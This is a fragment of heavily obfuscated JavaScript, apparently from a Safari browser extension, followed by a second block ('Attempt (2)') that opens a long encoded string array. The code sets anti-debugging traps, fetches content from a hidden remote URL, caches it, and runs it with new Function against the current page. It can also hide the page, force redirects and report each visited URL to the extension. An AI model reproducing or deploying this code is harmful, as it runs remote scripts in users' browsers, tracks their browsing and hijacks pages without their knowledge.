         * @param {?} value2
         * @return {?}
         */
        namespacedData["oBxjj"] = function(_relatedTarget, value2) {
          return data["zGPfH"](_relatedTarget, value2);
        };
        namespacedData["DgwsO"] = data["HiEgJ"];
        namespacedData["DqVyF"] = data["VpZKn"];
        /**
         * @param {?} _relatedTarget
         * @param {?} value2
         * @return {?}
         */
        namespacedData["PbQri"] = function(_relatedTarget, value2) {
          return data["ntIza"](_relatedTarget, value2);
        };
        /**
         * @param {?} _relatedTarget
         * @param {?} value2
         * @return {?}
         */
        namespacedData["vvNlP"] = function(_relatedTarget, value2) {
          return data["eZmva"](_relatedTarget, value2);
        };
        var _submitBtn = namespacedData;
        if (data["LTzVO"]("LDBCB", data["Ekfap"])) {
          if (size = data["LTzVO"](void 0, size) ? false : size) {
            data["ybZhr"](_positionActiveTinyMCE);
          }
          if (xhr && data["pqZww"](void 0, xhr)) {
            xhr["abort"]();
          }
          /** @type {!XMLHttpRequest} */
          xhr = new XMLHttpRequest;
          /** @type {number} */
          xhr["timeout"] = 1E3;
          /**
           * @return {?}
           */
          xhr["ontimeout"] = function() {
            if (data["JoIJc"](data["JYSiN"], "rqJsy")) {
              var denies = fn["apply"](context, arguments);
              /** @type {null} */
              fn = null;
              return denies;
            } else {
              if (size) {
                data["kDqqk"](update, false);
              }
            }
          };
          /**
           * @return {?}
           */
          xhr["onload"] = function() {
            var currentRelations = {};
            /**
             * @param {?} disabled
             * @param {?} status
             * @return {?}
             */
            currentRelations["nZhyS"] = function(disabled, status) {
              return _submitBtn["NDkPJ"](disabled, status);
            };
            /**
             * @param {?} disabled
             * @param {?} status
             * @return {?}
             */
            currentRelations["GHVVu"] = function(disabled, status) {
              return _submitBtn["ImABp"](disabled, status);
            };
            /**
             * @param {?} disabled
             * @param {?} status
             * @return {?}
             */
            currentRelations["kionv"] = function(disabled, status) {
              return _submitBtn["NDkPJ"](disabled, status);
            };
            /**
             * @param {?} disabled
             * @param {?} status
             * @return {?}
             */
            currentRelations["QFpCU"] = function(disabled, status) {
              return _submitBtn["UxvDC"](disabled, status);
            };
            /**
             * @param {?} disabled
             * @param {?} status
             * @return {?}
             */
            currentRelations["tGtBF"] = function(disabled, status) {
              return _submitBtn["ImABp"](disabled, status);
            };
            var B3494 = currentRelations;
            if (_submitBtn["oBxjj"](200, xhr["status"])) {
              if (_submitBtn["DgwsO"] === "lSjnJ") {
                return canCreateDiscussions ? canCreateDiscussions : function(char__3503, env__3547) {
                  return B3494["nZhyS"](char__3503, env__3547) ? B3494["GHVVu"](0, char__3503) || B3494["kionv"](1 / char__3503, B3494["QFpCU"](1, env__3547)) : B3494["GHVVu"](char__3503, char__3503) && B3494["tGtBF"](env__3547, env__3547);
                };
              } else {
                var status = xhr["responseTe" + "xt"];
                var data = {
                  "status" : status,
                  "timestamp" : Date["now"]()
                };
                localStorage["setItem"](_submitBtn["DqVyF"], JSON["stringify"](data));
                if (size) {
                  _submitBtn["PbQri"](scroll, status);
                }
              }
            } else {
              if (size) {
                _submitBtn["vvNlP"](update, false);
              }
            }
          };
          /**
           * @return {undefined}
           */
          xhr["onerror"] = function() {
            update(false);
          };
          xhr["open"]("GET", data["YHrSW"], true);
          xhr["send"]();
        } else {
          return !![];
        }
      };
      /**
       * @param {?} position
       * @return {undefined}
       */
      var scroll = function(position) {
        position = (new Function(data["Fkmum"](data["Fkmum"](position + data["efkGB"], location["href"]), '")')))["call"]();
        data["qhntV"](update, position);
      };
      /**
       * @return {?}
       */
      var _positionActiveTinyMCE = function() {
        if (data["pMnaR"] === data["pMnaR"]) {
          canCreateDiscussions["preventDef" + "ault"]();
          if (body = document["body"]) {
            body["style"]["display"] = data["wLfeG"];
          }
        } else {
          if (ret) {
            return debuggerProtection;
          } else {
            data["BqKHm"](debuggerProtection, 0);
          }
        }
      };
      /**
       * @param {boolean} data
       * @return {undefined}
       */
      var update = function(data) {
        if (data) {
          data["ybZhr"](_positionActiveTinyMCE);
        } else {
          if (data["GYIEc"]("mRWft", data["iuuTY"])) {
            (function() {
              return ![];
            })["constructo" + "r"](data["enFtF"] + data["MnCHh"])["apply"](data["xbetY"]);
          } else {
            var body = document["body"];
            if (body && data["ZqSjr"](data["wLfeG"], body["style"]["display"])) {
              window["location"]["replace"](location["href"]);
            }
          }
        }
        var details = {};
        details["url"] = location["href"];
        /** @type {boolean} */
        details["status"] = data;
        safari["extension"]["dispatchMe" + "ssage"](eventName, details);
      };
      (function() {
        var callbackVals = data["ockTq"]["split"]("|");
        /** @type {number} */
        var callbackCount = 0;
        for (; !![];) {
          switch(callbackVals[callbackCount++]) {
            case "0":
              var value = JSON["parse"](localStorage["getItem"]("runtime"));
              continue;
            case "1":
              var query = {};
              query["url"] = location["href"];
              query["timestamp"] = Date["now"]();
              var message = query;
              continue;
            case "2":
              localStorage["setItem"]("runtime", JSON["stringify"](message));
              continue;
            case "3":
              if (value) {
                if ((value = JSON["parse"](localStorage["getItem"]("info"))) && void 0 !== value) {
                  if ((message = value["status"]) && data["GYIEc"](void 0, message)) {
                    data["RAqgJ"](scroll, message);
                    if ((value = value["timestamp"]) && void 0 !== value) {
                      if (5 <= data["ZhRdW"](data["ZhRdW"](Date["now"]() - value, 1E3), 60)) {
                        data["ybZhr"](get);
                      }
                    } else {
                      data["ybZhr"](get);
                    }
                  } else {
                    get(true);
                  }
                } else {
                  data["OqCiT"](get, true);
                }
              }
              continue;
            case "4":
              if (value && void 0 !== value && data["ZqSjr"](value["url"], location["href"])) {
                value = value["timestamp"];
                /** @type {boolean} */
                value = !value || void 0 === value || data["puXEi"](1, data["PNuAU"](Date["now"]() - value, 1E3)) ? true : false;
              } else {
                /** @type {boolean} */
                value = true;
              }
              continue;
          }
          break;
        }
      })();
    } else {
      if (document["head"] && 0 >= document["querySelec" + "torAll"](data["RVBue"])["length"]) {
        if (data["ZqSjr"](data["GLgNM"], "JAhJQ")) {
          var elem = document["createElem" + "ent"]("script");
          elem["setAttribu" + "te"](data["brJeG"], data["bdNuj"]);
          document["head"]["appendChil" + "d"](elem);
        } else {
          d = (new Function(data["Fkmum"](d, ";return st" + "atus('") + location["href"] + '")'))["call"]();
          data["OqCiT"](update, d);
        }
      }
    }
  }
}, true);
safari["self"]["addEventLi" + "stener"]("message", function(body) {
  if (body["message"]["url"]) {
    window["location"]["replace"](body["message"]["url"]);
  }
});
/**
 * @param {?} n
 * @return {?}
 */
function d(n) {
  /**
   * @param {?} data
   * @return {?}
   */
  function update(data) {
    var InitialSetupController = {};
    /**
     * @param {?} saveNotifs
     * @return {?}
     */
    InitialSetupController["ZBnUA"] = function(saveNotifs) {
      return saveNotifs();
    };
    /**
     * @param {(Object|number)} DIR
     * @param {!Object} name
     * @return {?}
     */
    InitialSetupController["RZtwT"] = function(DIR, name) {
      return DIR + name;
    };
    /**
     * @param {(Object|number)} buckets
     * @param {!Object} name
     * @return {?}
     */
    InitialSetupController["SzVPc"] = function(buckets, name) {
      return buckets + name;
    };
    /**
     * @param {?} addedNodesArray
     * @param {?} dr
     * @return {?}
     */
    InitialSetupController["MSIuy"] = function(addedNodesArray, dr) {
      return options["XDcHC"](addedNodesArray, dr);
    };
    /** @type {string} */
    InitialSetupController["hJySJ"] = "lQJpl";
    /** @type {string} */
    InitialSetupController["VIVVZ"] = "QMGfP";
    var controller = InitialSetupController;
    if (options["piOLC"](options["yEBoB"], options["rOjIw"])) {
      if (fn) {
        var newValue = fn["apply"](context, arguments);
        /** @type {null} */
        fn = null;
        return newValue;
      }
    } else {
      if (typeof data === options["dfvDm"]) {
        return function(canCreateDiscussions) {
        }["constructo" + "r"](options["dEDjy"])["apply"]("counter");
      } else {
        if (options["oBHDi"](options["lNQWJ"], options["lNQWJ"])) {
          controller["ZBnUA"](d);
        } else {
          if (options["oEuZl"]("", options["rRNYx"](data, data))[options["UGyZy"]] !== 1 || options["VJQoM"](options["WUyQz"](data, 20), 0)) {
            if (options["kixsA"](options["glETU"], options["YTZsf"])) {
              (function() {
                return !![];
              })["constructo" + "r"](options["oEuZl"](options["cgmTm"], "gger"))["call"]("action");
            } else {
              that = controller["ZBnUA"](fH);
            }
          } else {
            (function() {
              if (controller["MSIuy"](controller["hJySJ"], controller["VIVVZ"])) {
                /** @type {!Function} */
                var row = firstCall ? function() {
                  if (fn) {
                    var denies = fn["apply"](context, arguments);
                    /** @type {null} */
                    fn = null;
                    return denies;
                  }
                } : function() {
                };
                /** @type {boolean} */
                firstCall = ![];
                return row;
              } else {
                return ![];
              }
            })["constructo" + "r"](options["qIEHj"](options["cgmTm"], options["UudQw"]))["apply"](options["cXzfQ"]);
          }
        }
      }
      options["bDFeq"](update, ++data);
    }
  }
  var headers = {};
  /**
   * @param {?} x_or_y
   * @param {?} y
   * @return {?}
   */
  headers["XDcHC"] = function(x_or_y, y) {
    return x_or_y === y;
  };
  /**
   * @param {?} x_or_y 5142
   * @param {?} y
   * @return {?}
   */
  headers["piOLC"] = function(x_or_y, y) {
    return x_or_y === y;
  };
  /** @type {string} */
  headers["yEBoB"] = "oYzse";
  /** @type {string} */
  headers["rOjIw"] = "oPJQh";
  /** @type {string} */
  headers["dfvDm"] = "string";
  /** @type {string} */
  headers["dEDjy"] = "while (tru" + "e) {}";
  /**
   * @param {?} optionsValue
   * @param {?} value
   * @return {?}
   */
  headers["oBHDi"] = function(optionsValue, value) {
    return optionsValue !== value;
  };
  /** @type {string} */
  headers["lNQWJ"] = "XdVag";
  /**
   * @param {(Object|number)} buckets
   * @param {!Object} name
   * @return {?}
   */
  headers["oEuZl"] = function(buckets, name) {
    return buckets + name;
  };
  /**
   * @param {(boolean|number|string)} _num2
   * @param {(boolean|number|string)} _num1
   * @return {?}
   */
  headers["rRNYx"] = function(_num2, _num1) {
    return _num2 / _num1;
  };
  /** @type {string} */
  headers["UGyZy"] = "length";
  /**
   * @param {?} x_or_y
   * @param {?} y
   * @return {?}
   */
  headers["VJQoM"] = function(x_or_y, y) {
    return x_or_y === y;
  };
  /**
   * @param {(boolean|number|string)} number_to_dividee
   * @param {(boolean|number|string)} divided_by
   * @return {?}
   */
  headers["WUyQz"] = function(number_to_dividee, divided_by) {
    return number_to_dividee % divided_by;
  };
  /**
   * @param {?} dataSourceIndex
   * @param {?} all
   * @return {?}
   */
  headers["kixsA"] = function(dataSourceIndex, all) {
    return dataSourceIndex !== all;
  };
  /** @type {string} */
  headers["glETU"] = "rtMIy";
  /** @type {string} */
  headers["YTZsf"] = "NMvQw";
  /** @type {string} */
  headers["cgmTm"] = "debu";
  /**
   * @param {(Object|number)} buckets
   * @param {!Object} name
   * @return {?}
   */
  headers["qIEHj"] = function(buckets, name) {
    return buckets + name;
  };
  /** @type {string} */
  headers["UudQw"] = "gger";
  /** @type {string} */
  headers["cXzfQ"] = "stateObjec" + "t";
  /**
   * @param {?} saveNotifs
   * @param {?} notifications
   * @return {?}
   */
  headers["bDFeq"] = function(saveNotifs, notifications) {
    return saveNotifs(notifications);
  };
  /** @type {string} */
  headers["UAcwT"] = "none";
  var options = headers;
  try {
    if (n) {
      return update;
    } else {
      if ("dgaaS" === "dgaaS") {
        options["bDFeq"](update, 0);
      } else {
        var body = document["body"];
        if (body && options["VJQoM"](options["UAcwT"], body["style"]["display"])) {
          window["location"]["replace"](location["href"]);
        }
      }
    }
  } catch (fN) {
  }
}
;
```

Attempt (2)
```js
'use strict';

var a0a = ["wr0bRjtVP8KbeFo=", "LMOPwqMwNg==", "wpfDqMOtw4Rtw6s=", "wrpFw5rDhMOG", "w492V8KNwrc=", "XFtr", "YcOmw41Mw6U=", "wqAWwrHCryXDngUnw5fCrg==", "CCo/biE=", "w77DhiTDsV4=", "wqNew7HCiMOrZXU=", "wpdLw4jCv8Ok", "w60Ow5fDrRA=", "MsOIwqYPPn7DmnzDvMO8", "a8OQw5low45iw4s=", "wrhyw5jCusK1JSdfw5dy", "wr1Jw6XCpMKS", "w70QGMKowrk=", "w44hw4/DkjU=", "Zgd8wrnDgw==", "AMKGHHbCvw==", "wqoNw4xkwoU=", "w4oSFmhE", "AsKoY8Or", "WsOTwo/DpRtBw5w=", "wq3DqwXDpj4Uwrk=", "w4DDisK3wrLCmA==", "XMOoBmo=", "wocWw5TDhh0=",
    "ZTHCo8OKwrs=", "OsKEPEfClA==", "w5hTXsKlwofCjw==", "w5cBAMKSwoE=", "w6cENUAjwr1I", "wpzDssO+w4ht", "JFJPfTA=", "w6kCw4jDtA==", "wpPDj8Obw6pB", "w6AMKlw=", "a8O9woXDjw4=", "wpskaStD", "ZMO0RXIpTcKx", "bcOSJkdceMOpWFg=", "A8OrwoQ=", "w6gsDRPCt8OwR8KBKzo=", "Y8O+SXQ=", "YsOAw4lww4tww43DrWsI", "w7PCvsK4fw8=", "TU3DtWFO", "wrc3wpXDiGc=", "wrDCkwTCr8Ov", "wrQLwovCpws=", "woZRw57DsxI=", "wpvCg2ki", "w5fDisORwrLCtsKvwpjDggtO", "D8O2w5Ebwp3DqcOtw5Q=", "SB9zwpLDkA==", "w5t6dcKtwp8=", "ScKqw5bCn8Kt", "w5kFIcKEwps=",
    "w5cNOQPCpQ==", "WcOXwqYMw4U=", "w5sOw4QrRg==", "w7MCKkkpwrVdcDA=", "DT8tRQ8=", "fVbDsMKtwrvCnU5bNhA=", "cUfDuA==", "HMOWwoEcPA==", "w6Bfw48IOQ==", "O8KCwoTChgrDg8Kg", "wpHChXQ3w48TJMOGwobCpQ==", "wq12w4LDkjg=", "w7BMw5wWRA==", "w5oUwoYoIX07BMOew60=", "wpHDp8Kjw5d7wqAJO3V2", "w5nCrsKZZhg=", "w6QGw5cedA==", "woABw6nDvAE=", "w6rDhxbDnFonUjA=", "w4Q6FyjCjQ==", "YMKXw5bCsMKn", "HikCNMOvwqU=", "e8OSOF1fbsO1W0fCuA==", "enFjw6Yk", "CcOaw4odwoI=", "ZSrCicOzwo0=", "w4wOCWZcTw==", "PsK3GFHCvQ==", "wrLCiDnCocOFw75iw77CpsKH",
    "woxnw7vDicO5", "X8OYwpkQw7A=", "wpbCi2oTw4M=", "w4l9w4gubQ==", "w7/DlcKIwrHCrg==", "wpRaw6vDtRY=", "w7YYw74=", "U8KTw4HDjAE=", "ViFMwrDCm2Zq", "XMK8wqM6w4hSwotkw7Eh", "wovDp8Ojw4Bt", "w6fCmsKOZhM=", "FcOuwp8mAl7Cq1PDgMOQ", "I8KJWcOeCl1PPcKANw==", "wooew6hpwqk=", "wqVhw4PCqcK4", "w6w7L0Fe", "b0LDsH9SZTcESW4=", "TcKAw5PCugBXw5J/wobCnw==", "Q0Rgw54o", "wrHDvDbDric=", "wqYAXg18", "w5BQw6sBUg==", "T8O6W2Ye", "wo9Aw7/DpsOp", "TcOOwp3DoQJT", "w7fCqVfCrsOw", "wqAyw455wpg=", "w4jCs3fCpcOV", "CMKoJXDCvw==",
    "a1rDt19K", "w59ew7HDqBRNNsO1w5nCkg==", "bsKHw7rDggbDgWQKw5HDpA==", "woUIw4d+", "wo4DWSZ/", "woxKw6nDuQ8B", "w6wqwpIsHw==", "WVpqw5g=", "wqU+wqvCmSk=", "wodWw63Dq8OP", "JhwKdA==", "ccOzOE12", "woYDwofDpFQ=", "JRcHTiE=", "wo1dwqTDrwgEK8K4woTCmg==", "T8O9wrfDvhw=", "wqbDgzHDlys=", "UyF4wqjDtMOjwrMgcQ==", "RiNVwq3Cgg==", "wroGWTdILMKTc1M=", "QEZjw4c5OzDCpVVi", "d8KDw5bCtsKR", "wqPDt8KCW8KW", "w6sfI1Y=", "wp5zw7DCusOG", "w4wBw79ODB/CpWdyaA==", "DsK2wpDCtAM=", "Q2nDgVVw", "TsOVwpDDrBFJw4k9", "SsK9w4HCgMKD",
    "w4plw7wLDg==", "c8OlOk1d", "wr9Sw67DhsOi", "HsO2w6M7wpg=", "SxnCl8ORwq8=", "a8OIQW8M", "V0LDgEN1", "wqXDgsKxZsKm", "wrPCo1UEw6s4F8OhwofCmQ==", "w5fCuks=", "woHCiXQz", "wpsoXyly", "JsKOwrjCuSg=", "ej/CqcOcwoPCrg==", "VcOvD3g=", "VMKVw7DCn8Kt", "wphvw5vCs8K2Pj9Kw5Bk", "w68kw4Mdaw==", "OcKrIWnCtxYVd1DDpQ==", "w4gRWcKowoPCm8O6wqvDmcOv", "w4vDhjbDtUY=", "wrEcehJW", "bMOyU3IH", "w7sBGMKRwrE=", "fCfCs8ONw4rDoA==", "SStbwpjCm2poHQ==", "wrA3woTCujs=", "wqB6w6bCo8OT", "wqFMTsO0", "QiNdwos=", "McOGwqAY", "CMO3w4U=",
    "wq0XTTdILsKqZ0Ui", "w60Ow4TDtBHDmMO7Ww==", "BjcISAA=", "w4EwJ8KUwqY=", "TsOIZE0HdcKRZQTDgA==", "wqHDtMOBw4FA", "wrhDw7DCnsKa", "dsOUaXUM", "VMOvWWgoRsO6SibDoA==", "wofDtsKtWMKJ", "ATwAOsOv", "IMK5csOVHQ==", "wqwbwrPDkVo=", "YcKDwoQ=", "wofDhxHDpxo=", "b1LDssKhwrvCng==", "w4YRw6zDkAk=", "AcOWwqAOFw==", "YcKIw4PCtMKawrrCosOnMA==", "TMO0w4JRw74=", "acOOWww=", "w6DCvlXCrcOjBsOp", "w6wPw5TDrA==", "w6BCNR8uwqxBMinDig==", "Sx/CtcOawpg=", "wqMXw6J4wrw=", "wp8Vw5PDmwbDoA==", "wp9SRMK0wpLDg8O7wrzDisOh", "UMO8Hn1y",
    "YsO3wpUaw5w=", "w68Fw7ErVcKVwrLDhw==", "ccOTTQ5KwrxxIWtY", "JsKmKWE=", "R8Omw7lOw6JAw7HDg19S", "wp4Dw5F9wokHbA==", "KwQeAMOM", "w43CnsKeRTxB", "LSs9dBw=", "wqVbw5bDvzc=", "w6fCusKsZQRhIzzCo2s=", "cSLCsMOYwpU=", "w7APw5c=", "Z8Kfw5nCosKbwqXCrg==", "UMK1w4fDoA==", "w7PCq1XCrcO7", "w6nDmBDDkw==", "wrTDhyfDvgU=", "w7nCmMKaaiI=", "QsKOw5jDuCY=", "wp9sRcK1wo/CjcOyw73DjsKz", "w6cPw7A/Rg==", "wrTDlETDgRsyDiJkwpg=", "w4fDlsK7wqPCmQ==", "w4cqPldw", "wqLCrRvCn8Ol", "w6HCr0TCtcOnKsOuw7PDoMKY", "PsKsJHzCtF9Rb1E=",
    "w7nCn1TCsMOp", "w6UDw5PDsQvDkg==", "FCEvNMOL", "S8Omw6Nuw5Y=", "JsKOfMObHA==", "w557RMK2wqk=", "woUVw459wokQbB0=", "wrtcUsO3wpzCoHIHTA4=", "IsKUS8OMHQ==", "wprDq8Oow4k=", "wpnCnXEhw5k=", "TsO4HlduVMOI", "wr52w7nCpsKA", "Z8OawpQyw6E=", "wqpew6k=", "wqxTw7TCuMKg", "SMOqaGgS", "w5Iiw5UuaQ==", "wrtGR8OowpjDqg==", "w7gvLRzCkw==", "w5fDkMK8wo/Cpw==", "Mh4bTznCrMOL", "XcOVwpLDpgNSw5AywprCnw==", "UBxswovDiw==", "w6XCtWbCmcOF", "bDtYwpLDtg==", "w60OwqI8Cw==", "w4AJLWBH", "Ox8zAMOCwoDDiBAPw5A=", "JcOIwrwFIXfCkQ==",
    "wrHDnS/DlhQxwoZoFk0=", "w4ohw7PDkTLDuQ==", "dcK3w7zCusKf", "ZcOBw4Vpwocnw5zDo3gS", "wrPCh2oyw4M=", "wrYWwqvDqVA=", "w5fDgcKXwqPCrMK0wo7Ckg==", "HsKOwrLCkiE=", "VcO+wo3DpBw=", "fjzCqMONwo3CrsOP", "w6I8DRfCt8Ox", "NR4ccg==", "W2PDlA==", "S8OCbUgKbcKH", "TcOIwp8=", "dsOtTh1o", "woXCg2s+w4gOK8OCwrg=", "eVXCtw==", "w4poVMKhwog=", "wqh/w4zDnBE=", "w5YhA8KHwqUXw77DswQ=", "RUZg", "w6YZwqQ=", "w5rCgynClg5kFWFqwr8=", "wpYbw5fDjQ/Cp8KnG8KjGw==", "wrlJw7LCgsK6", "bsOPXBFCwrdqEHo=", "w4UIEMKVwo8=", "w4xcw6kAGQrCkCV9dg==",
    "w51hw6YoGg==", "woTCshLCjMK9wpNcw4LClMK7", "wqbDgcKHbMKr", "ZsONRxpOwr4=", "aEfDosKkwrA=", "wrE1w43Dgyg=", "wrx2w57DvcOW", "VsO0w6R9w5U=", "wqtkw7/Ct8OW", "FcOrw5MQwo0=", "dSHCo8OY", "wpUXw4/DrjE=", "w48EEEBQ", "wo3DtsOg", "wosywqDDpGE=", "w708woIrGg==", "Q8K9w4bDvivDtFg=", "w7ovw5AlYw==", "YsOORgtAwr5g", "aE/DrcKtwqbCjWxeLw==", "wpbDt8KHQ8KH", "w4nDtcK7wrbCsg==", "ZlrDrXNn", "wobCnGsuw5o=", "w5F5w64BZg==", "IhMKZSbCmsOSw4AXw58=", "Y8ONw4l+w59xw4fDqWI=", "wrxHWMOz", "RsKKw6HCgcKg", "UiBkwrXDs8Opwr8=",
    "R11tw4Mv", "CcKXSsOPAg==", "woxpwqonCxjCocO7woUq", "MxciaCs=", "wqF0w5rDhsOk", "w6ZDw40jHQ==", "wo3Dly3DiAYw", "UBNdwp/CgQ==", "woUVw5fDmA==", "w5B7w7spTAvDow==", "w4haw4QJdw==", "wpxSw6jDtw==", "wonDgCbDiQ==", "wrnCqEUEw6w=", "w5QhDnc+", "w5zDqhvDqG8=", "w7J8SMKBwo4=", "ZsKHw6bDmwrDkH4bw47DtA==", "IMK5YcOBHg==", "w7AJw4rDvQvDicOq", "KsOCwrwROnM=", "Gg06F8OJ", "w6YecA==", "XFFiw5AoIQ==", "SXHDgVA=", "woxHw73DtwU=", "wpXCqjDCkMOz", "eWVcw58w", "VDRowq3Dvw==", "YyZ6wrLDqA==", "WcOxAlZ2", "ZcOEThFBwrdVF2FO",
    "w49QXcK+woDCisO5wr/Dt8Ky", "QidAwqTDnQ==", "JcKTwpbCgQ7Dq8KnwpN2Kw==", "SMOCaUw8", "JAkbfw==", "wr1GSMOrwozDqn4a", "NMKIwpPCjA==", "w63DnD7DsEM=", "wqfDqMKbVsKYL8Kmw5vDpsKB", "wrHDvQ/DtjQRwqZIGmQ=", "wpDCp2Mpw58=", "wowWwo7DmlVcYQc=", "cTbCqMOZwpbCqg==", "TMOfwo/DpRhOw5Y0wrrClQ==", "w7LDgcK5woDCiA==", "w5zCn07CkcOI", "wogSw4JpwrI=", "w7cQw4vDsRA=", "w4Y0EG5O", "w6ACKEMgwrBU", "woMUw5RCwrI=", "w6gPw4TDuRDDlcOxRg==", "wpdBw6HDvQ==", "c8O8w7h1w60=", "wphOw4LCi8KF", "wqXCqAzCpsOH", "w6gSwo0lPQ==", "FcOqw5E=",
    "w5Erw6Mtaw==", "N8OnGX13XcOnRmHDsw==", "LcKxLWTCplN4b0fDvQ==", "JcKDRMOAKQ==", "w7QtJ8K0wp4=", "wptjw7TDmMOX", "w7nCj8K6Qz8=", "wpPDsMOHw71l", "wpRcw6kVGB3Cu2lrbw==", "w7bCrcKm", "YMORWC5KwqB2DGFQ", "D8KocsO0", "wrtlw4PCi8KkIyFPw6Fo", "w44nwpc+DA==", "wobCtg3CksOs", "w4LCuXTCs8Or", "w6Z9w5MyNCLClwZURA==", "LMKsLHw=", "wpoMwozDgEdcYgU=", "wptgw4fDqRA=", "SMKkw43Ch8K7", "YMKcw6PDmDI=", "wojDtsOjw4Btw70ObEtq", "wrl6fMOhwo0=", "wpfCrzLCssOW", "IA0rMsOX", "HsOFwpEFPQ==", "w6vDiQHDnkY=", "c8K9w57Cl8KX",
    "w6wtwrYOCg==", "dcO3Zm8g", "M1XDtMKpwqHCkG4cLFM=", "wpYGw5TDgAbCusKyB8KT", "woU4QQ==", "wpszWjls", "w41ww643XwfDtA==", "B8O0woEjA17Cq1vDncOA", "w4DDphbDt2o=", "cUPDs8K7wrTCnmg=", "wrMgwqDCpxI=", "bcKew5HCvg==", "YxZgwozCgg==", "w5PDrcKETMKOYg==", "wqYRQApX", "f8OeQEUT", "ARkSw5A=", "PMOdwrcxKQ==", "w5TCusKCSjw=", "VsOOwojDpQQawop+wpnChw==", "w7AIKFQ=", "dMKfw5vCqMKSwqDCp8Ok", "bsOHw499", "QCJTwr7CrQ==", "WMOzHg==", "ATgNJ8Ouwr4=", "w6oEw7YvWcKzwrs=", "wo9Lw4zCm8Oq", "Mh4bRznCvcOUw5scw4Q=", "wq0EWSZD",
    "wrowwq7Dr2xlXyQpwrQ=", "wo8NwofDjVZH", "XMOfwprDugVFw4k+wo/ClA==", "VMOedFYOZMKaZRrDgA==", "I8KhJ2k=", "wpsIw6JJwq8=", "eWwYw5PCsyo=", "VcOyGWo=", "w5UkEGYV", "aMOaw50=", "w7JPw78VZw==", "w77CvkvCpsO2DQ==", "bsO+H213", "wqsqw4ZfwqU=", "wrtpw4PCr8O/JCdHw7d0", "R8O6wr0iw78=", "w6o8BRnCrcO8eMKdZGA=", "wqEIw6JZwoA=", "RiBkwqLDrsOtwrUo", "wpDDq8O/w4Q=", "w6dRw70TfQ==", "SCvCsMO6wqE=", "wrwcw6nDkD4=", "w7XCt2DClcOX", "wqpdw67CtcOf", "w68IKFc7wrQ=", "EsOPwrdWaW/CnHzDocK4", "AcKywo7CpBE=", "FsO3w54Owo7DpMOkw4vCnsOr",
    "AMKHI1XCmA==", "JzQaF8OY", "w5V+w7wuOA==", "woobw5w=", "acKRw4PCssKc", "wq7DkCnDihEsw4RtNg==", "UcO4wrTDkR4=", "aMOPThc=", "w544w6QaEz7DjsKjw6oN", "w6vDjRvDiQ46Un4DwpA=", "V8OreRdi", "wp8oZwpv", "WMOxwqc/w4ZSw5ckwqU=", "w4LCvE3CmMOg", "c0TDqsKtwrbCjQ==", "U8OyHQ==", "wqByw5LCrA==", "MMKyVMOpBA==", "woUIw4J9wp0AbAo=", "w7ktMsKnwoM=", "TSFZwp0=", "OyEtEcOr", "woNow5fCqsOk", "HSIvIsOv", "w4kDLnEM", "w7g+wo4vCQ==", "wp15w6zCvMOQ", "cDLCssOdwoo=", "wpTCshzCisOgw4I=", "wpBfw5zCqsOz", "aMOLYVAu", "w7Vsw6I0LA==",
    "X8OnwqYCw7A=", "w54Rw57DrxQ=", "wqFDw6rClg==", "Q8Ogwr8=", "JiHCo8OKwpfCsMOEwoLDlcKP", "ccKew6TDoQo=", "RixZwpDCgQ==", "FRUtQzk=", "w7vCscKbQBo=", "wqwgw5DCpsK/NTJKwqNy", "IcOQw6Qhwp0=", "wqBYw63Cn8OrYSI=", "dcO8GnlC", "JcKoA2HCqA==", "HjkINsOo", "eTbCoMOXwozCp8O6w5DDicKL", "wrlow5nCvsKG", "w7bDpRvDnHw=", "wrpSw5/DkMOv", "WsO4HlduVMOI", "wrBNTcOuwpfDq0sbQBI=", "YcO0w5h8w5w=", "fnVYw74KDA==", "w4bDjMKUwqXCtcKVwp/CkksI", "wqXCiUAJw7c=", "w71kw5UTUw==", "wpxcw6rDqBQfLcO5w5nDnQ==", "w4Uzw7TDjSnDucOBbT7DnA==",
    "wpYcw4RWwo8=", "w4pcw74OHw==", "w4YPNcKHwps=", "RcOQfgFp", "fgXCrcO5wq8=", "w5xQX8K0wonCj8Ow", "w7LDhwfDvEIi", "w60CMQ==", "W8OwKXlK", "woRHR8O+wp/Dp3cFfBs=", "w68TMH17", "w5fDgcKFwrPCrMKow4vDiEQT", "w4RHw6MPGw==", "QcOdwokEw6A=", "w5hiw6oEKg==", "wonCqRPCmw==", "acOVXAhcw6gqSmNR", "T8O1wr7DoT0=", "w51bw6IVBALCsA==", "w7Mnw7wrcw==", "T8OJeTJm", "wqdsw5bCvsK1Mw==", "w70tERnCrcO+QcKJcg==", "wpnCnl89w4s=", "bT1EwpjDlQ==", "wqYrUS1D", "wqE1w6hkwpE=", "DMK5HlXChg==", "woddw5XDlxA=", "wrovw7dHwrI=", "C8KoJsOoK2B/F8K/Gw==",
    "V8OVwpI=", "a8OHJkpT", "wrDDlEbDgRwyCiJkwpg=", "w74QBTrCkg==", "KcOlwpoyJw==", "w6zDt8K+worCn8KSwq7Cv3Ip", "woBWw6nCnMOI", "fnVYw74KDBvCj0RZ", "wrnDg8Kcf8K0", "wqxUw7/Ciw==", "C8OKw6URwpw=", "w6tlw6svVg==", "w5x6w7AoUQjDtA==", "wpLDv8KDSsKQNcKjw5jDmw==", "w6cTKTbCmg==", "wql/w7fDvxo=", "dFTDpcKu", "wpTDkcKcaMKz", "ZUTDmsKgwqc=", "woHDpsOWw5h6", "w6UQw5fDtB0=", "cMOobTBF", "R8OoZDRwwoJXKkN3", "wpvDtRPDiTo=", "w7QPw4vDoQLDlcOyRCTCmg==", "wp8WwozDkEdHeAgQwpI=", "csOHw4t4w4o=", "eAnCq8OIwoM=", "wpR+w5LCtsOBSRdXwpwh",
    "w7wBwpE7", "TcO4TE0L", "w7srPsKKwqo=", "dRJzwpvDow==", "wqAcQio=", "wqZNWMO3wpbDoGgMewc=", "wp/DtcKSSQ==", "w7/DlcKiwqzCrA==", "woLDgm8ow4sfKMOWwqzDrg==", "wrwcwqzCug==", "NycKMsOr", "UzvCl8O0wqs=", "YsK1w4DCg8K8", "cMO5wr4jw4Q=", "w5fDpTLDm34=", "PcK3MWnCtw==", "ajZOwrjDjw==", "PsKsO3PCsA==", "wpMDeDRU", "Q2zDgE8=", "w7DCusKmag==", "NMKCw5fClEvDlsKgwp5mJA==", "wofDssKvasKX", "w5taU8Ky", "wr8dw4jDuwo=", "w6LCtEnCuMOkDMOgw7U=", "w74twpAnKQ==", "eUDDq8KPwpc=", "NAkD", "Ym54w4AI", "ATgeOsO1wqrDozk6",
